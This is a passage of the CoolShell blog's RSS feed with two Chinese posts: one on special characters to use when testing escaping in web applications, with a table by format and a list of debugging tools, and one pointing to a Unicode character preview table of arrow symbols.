+<p style="text-align: left;">这里有一篇Matthias写的<a title="The art of escaping" href="http://united-coders.com/matthias-reuter/the-art-of-escaping">关于转义字符文章-“The art of escaping”</a>，这篇文章告诉你有一些比较特殊的字符需要你去认真的处理，不然，你的网站程序轻则出错，重则被人黑了。这些物殊的字符是[<code>&lt;"@%'&amp;_\?/:;,&gt;কী €</code>] ，你可以使用这个字符串到任意一个可以输入的Web程序上去做测试。</p>
+<p>下面这个表格告诉你为什么这些字符很特殊。这个列表不会是完整的，而且也永远不会完整。<br />
+<center></p>
+<table border="0">
+<thead>
+<tr>
+<th>相关领域</th>
+<th>转义字符</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a title="W3C" href="http://www.w3.org/">HTML</a></td>
+<td>&lt; , &gt; , &amp;</td>
+</tr>
+<tr>
+<td><a title="JSON-Resource" href="http://json.org/">JSON</a></td>
+<td>&#8220;</td>
+</tr>
+<tr>
+<td><a title="mysql character" href="http://dev.mysql.com/doc/refman/5.0/en/string-syntax.html">SQL</a> in mySql</td>
+<td>字符串 &#8220;, &#8216;, 通配符 %, _</td>
+</tr>
+<tr>
+<td><a title="rfc 1738 for urls" href="http://www.faqs.org/rfcs/rfc1738.html">rfc 1738</a> for URL-parameter</td>
+<td>;, /, ?, :, &#8220;, @, =, &amp; 空格</td>
+</tr>
+</tbody>
+</table>
+<p></center><br />
+把这些转义字符放在一起，然后再整些 utf-8 的一些特殊字符。这些utf-8的字符你可以参看本站的<a rel="bookmark" href="https://coolshell.cn/articles/1331.html">Unicode字符预览表</a>一文，并从中获取。另外，你还可以使用下面的这些工具来对你的程序进行调试或检查：</p>
+<ul>
+<li>一个高级Web调试插件： <a title="firebug plugin" href="https://addons.mozilla.org/de/firefox/addon/1843">firebug</a></li>
+<li>标准的请求/响应插件： <a href="https://addons.mozilla.org/de/firefox/addon/3829">Live HTTP headers</a></li>
+<li>一些抓包程序： <a href="https://addons.mozilla.org/en-US/firefox/addon/6647">HTTPfox</a> or <a href="https://addons.mozilla.org/en-US/firefox/addon/966">tamper data</a></li>
+<li>IE的开发者可以试试这个：<a href="http://www.fiddler2.com/fiddler2/">Fiddler.com</a></li>
+</ul>
+<p>如果上面的工具都不能帮助你的话，你可能需要打调试日志，或是使用一个透明的代理服务器：如： <a href="http://www.charlesproxy.com/">Charles Web Debugging Proxy</a> （Windows）</p>
+<p>（全文完）<!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/3684.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2011/02/1128-150x150.jpg" alt="Web开发人员速查卡" width="150" height="150" /></a><a href="https://coolshell.cn/articles/3684.html" class="wp_rp_title">Web开发人员速查卡</a></li><li ><a href="https://coolshell.cn/articles/21649.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2021/11/il_340x270_pggv-150x150.jpg" alt="源代码特洛伊木马攻击" width="150" height="150" /></a><a href="https://coolshell.cn/articles/21649.html" class="wp_rp_title">源代码特洛伊木马攻击</a></li><li ><a href="https://coolshell.cn/articles/17634.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2017/01/pretty-code-150x150.gif" alt="Chrome开发者工具的小技巧" width="150" height="150" /></a><a href="https://coolshell.cn/articles/17634.html" class="wp_rp_title">Chrome开发者工具的小技巧</a></li><li ><a href="https://coolshell.cn/articles/12206.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2014/12/html6-150x150.jpeg" alt="HTML6 展望" width="150" height="150" /></a><a href="https://coolshell.cn/articles/12206.html" class="wp_rp_title">HTML6 展望</a></li><li ><a href="https://coolshell.cn/articles/9666.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2013/05/Render-Process-150x150.jpg" alt="浏览器的渲染原理简介" width="150" height="150" /></a><a href="https://coolshell.cn/articles/9666.html" class="wp_rp_title">浏览器的渲染原理简介</a></li><li ><a href="https://coolshell.cn/articles/8711.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2012/12/200906020837401710-150x150.jpg" alt="程序员疫苗：代码注入" width="150" height="150" /></a><a href="https://coolshell.cn/articles/8711.html" class="wp_rp_title">程序员疫苗：代码注入</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/1957.html">Web程序的最佳测试数据</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/1957.html/feed</wfw:commentRss>
+			<slash:comments>1</slash:comments>
+		
+		
+			</item>
+		<item>
+		<title>Unicode字符预览表</title>
+		<link>https://coolshell.cn/articles/1331.html</link>
+					<comments>https://coolshell.cn/articles/1331.html#comments</comments>
+		
+		<dc:creator><![CDATA[陈皓]]></dc:creator>
+		<pubDate>Mon, 24 Aug 2009 15:45:36 +0000</pubDate>
+				<category><![CDATA[杂项资源]]></category>
+		<category><![CDATA[Unicode]]></category>
+		<guid isPermaLink="false">http://coolshell.cn/?p=1331</guid>
+
+					<description><![CDATA[<p>关于Unicode的字符表，你可以在这里下载： http://www.unicode.org/Public/5.1.0/ucd/UnicodeData.txt ...</p>
+<p class="read-more"><a class="btn btn-default" href="https://coolshell.cn/articles/1331.html"> Read More<span class="screen-reader-text">  Read More</span></a></p>
+The post <a href="https://coolshell.cn/articles/1331.html">Unicode字符预览表</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></description>
+										<content:encoded><![CDATA[<p><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3415450859608158"
+     crossorigin="anonymous"></script>关于Unicode的字符表，你可以在这里下载：</p>
+<p style="padding-left: 30px;"><a href="http://www.unicode.org/Public/5.1.0/ucd/UnicodeData.txt" target="_blank">http://www.unicode.org/Public/5.1.0/ucd/UnicodeData.txt</a></p>
+<p>而有热心人通过上面个表格，使用JavaScript制作了下面这个网页，其穷举并可以显示上述定义的所有的Unicode字符。</p>
+<p style="PADDING-LEFT: 30px; TEXT-ALIGN: left"><a href="http://www.ftrain.com/unicode/" target="_blank">http://www.ftrain.com/unicode/</a></p>
+<p style="TEXT-ALIGN: left">打开这个网页，左边的那个大表格是一个10&#215;10的列表，每个小单元格上面是这个字符的样子，下面是这个字符的HTML输入格式。这个表格下面是一个预览格，因为有些这符太细腻了。</p>
+<p style="TEXT-ALIGN: left"><span id="more-1331"></span></p>
+<p style="TEXT-ALIGN: left">当然，所有的字符不肯定不止100个，所以，网页右上角有三个进度条，一个是100个字符的往后移动，第二个是1000个字符，第三个是10000个。</p>
+<p style="TEXT-ALIGN: left">随便找了一下，找到下面这些各式各样的箭头，如下所示：</p>
+<style type="text/css">
+td,td {width:50px;height:50px;text-align:center;vertical-align:center;font-size:2.5em;border:1px solid #ccc;}
+.exp {font:8pt sans-serif;color:#aaa;height:1em;}
+</style>
+<table border="1">
+<tbody>
+<tr>
+<td>← <span class="exp">&amp;#8592;</span></td>
+<td>↑ <span class="exp">&amp;#8593;</span></td>
+<td>→ <span class="exp">&amp;#8594;</span></td>
+<td>↓ <span class="exp">&amp;#8595;</span></td>
+<td><img src="https://s.w.org/images/core/emoji/14.0.0/72x72/2194.png" alt="↔" class="wp-smiley" style="height: 1em; max-height: 1em;" /> <span class="exp">&amp;#8596;</span></td>
+<td><img src="https://s.w.org/images/core/emoji/14.0.0/72x72/2195.png" alt="↕" class="wp-smiley" style="height: 1em; max-height: 1em;" /> <span class="exp">&amp;#8597;</span></td>
+<td><img src="https://s.w.org/images/core/emoji/14.0.0/72x72/2196.png" alt="↖" class="wp-smiley" style="height: 1em; max-height: 1em;" /> <span class="exp">&amp;#8598;</span></td>
+<td><img src="https://s.w.org/images/core/emoji/14.0.0/72x72/2197.png" alt="↗" class="wp-smiley" style="height: 1em; max-height: 1em;" /> <span class="exp">&amp;#8599;</span></td>
+</tr>
+<tr>
+<td><img src="https://s.w.org/images/core/emoji/14.0.0/72x72/2198.png" alt="↘" class="wp-smiley" style="height: 1em; max-height: 1em;" /> <span class="exp">&amp;#8600;</span></td>
+<td><img src="https://s.w.org/images/core/emoji/14.0.0/72x72/2199.png" alt="↙" class="wp-smiley" style="height: 1em; max-height: 1em;" /> <span class="exp">&amp;#8601;</span></td>
+<td>↚ <span class="exp">&amp;#8602;</span></td>
+<td>↛ <span class="exp">&amp;#8603;</span></td>
+<td>↜ <span class="exp">&amp;#8604;</span></td>
+<td>↝ <span class="exp">&amp;#8605;</span></td>
+<td>↞ <span class="exp">&amp;#8606;</span></td>
+<td>↟ <span class="exp">&amp;#8607;</span></td>
+</tr>
+<tr>
+<td>⇞ <span class="exp">&amp;#8670;</span></td>
+<td>⇟ <span class="exp">&amp;#8671;</span></td>
+<td>⇠ <span class="exp">&amp;#8672;</span></td>
+<td>⇡ <span class="exp">&amp;#8673;</span></td>
+<td>⇢ <span class="exp">&amp;#8674;</span></td>
+<td>⇣ <span class="exp">&amp;#8675;</span></td>
+<td>⇤ <span class="exp">&amp;#8676;</span></td>
+<td>⇥ <span class="exp">&amp;#8677;</span></td>
+</tr>
+</tbody>
+</table>
+<p>还有很多更奇怪的字符，你可以上去看看。如果你访问不了了，你可以通过本站下载这个文件：《<a href='https://coolshell.cn/wp-content/uploads/2009/08/Unicode-table.htm' target=_blank>Unicode 字符集预览表</a>》</p>
+<p><!--
+
+
+
+<p align="center"><a href= target=_blank><img decoding="async" src=""></a></p>
+
+
+
+
+
+<p align="center"><img decoding="async" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.weixin.jpg"> <img decoding="async" loading="lazy" src="https://coolshell.cn/wp-content/uploads/2020/03/coolshell.mini_.jpg" width="300" height="300"> <br />关注CoolShell微信公众账号和微信小程序</p>
+
+ 
+
+--></p>
+<div style="margin-top: 15px; font-size: 16px;color: #cc0000;">
+<p align="center"><strong>（转载本站文章请注明作者和出处 <a href="https://coolshell.cn/">酷 壳 &#8211; CoolShell</a> ，请勿用于任何商业用途）</strong></p>
+</div>
+
+<div class="wp_rp_wrap  wp_rp_vertical_m" ><div class="wp_rp_content"><h3 class="related_post_title">相关文章</h3><ul class="related_post wp_rp"><li ><a href="https://coolshell.cn/articles/21649.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2021/11/il_340x270_pggv-150x150.jpg" alt="源代码特洛伊木马攻击" width="150" height="150" /></a><a href="https://coolshell.cn/articles/21649.html" class="wp_rp_title">源代码特洛伊木马攻击</a></li><li ><a href="https://coolshell.cn/articles/3684.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2011/02/1128-150x150.jpg" alt="Web开发人员速查卡" width="150" height="150" /></a><a href="https://coolshell.cn/articles/3684.html" class="wp_rp_title">Web开发人员速查卡</a></li><li ><a href="https://coolshell.cn/articles/1957.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/9.jpg" alt="Web程序的最佳测试数据" width="150" height="150" /></a><a href="https://coolshell.cn/articles/1957.html" class="wp_rp_title">Web程序的最佳测试数据</a></li><li ><a href="https://coolshell.cn/articles/3013.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/uploads/2010/09/biolab-150x150.jpg" alt="一些非常有意思的杂项资源" width="150" height="150" /></a><a href="https://coolshell.cn/articles/3013.html" class="wp_rp_title">一些非常有意思的杂项资源</a></li><li ><a href="https://coolshell.cn/articles/1954.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/13.jpg" alt="Java读写Excel" width="150" height="150" /></a><a href="https://coolshell.cn/articles/1954.html" class="wp_rp_title">Java读写Excel</a></li><li ><a href="https://coolshell.cn/articles/2967.html" class="wp_rp_thumbnail"><img src="https://coolshell.cn/wp-content/plugins/wordpress-23-related-posts-plugin/static/thumbs/28.jpg" alt="代码优化概要" width="150" height="150" /></a><a href="https://coolshell.cn/articles/2967.html" class="wp_rp_title">代码优化概要</a></li></ul></div></div>The post <a href="https://coolshell.cn/articles/1331.html">Unicode字符预览表</a> first appeared on <a href="https://coolshell.cn">酷 壳 - CoolShell</a>.]]></content:encoded>
+					
+					<wfw:commentRss>https://coolshell.cn/articles/1331.html/feed</wfw:commentRss>
+			<slash:comments>5</slash:comments>
+		
+		
+			</item>
+	</channel>
+</rss>
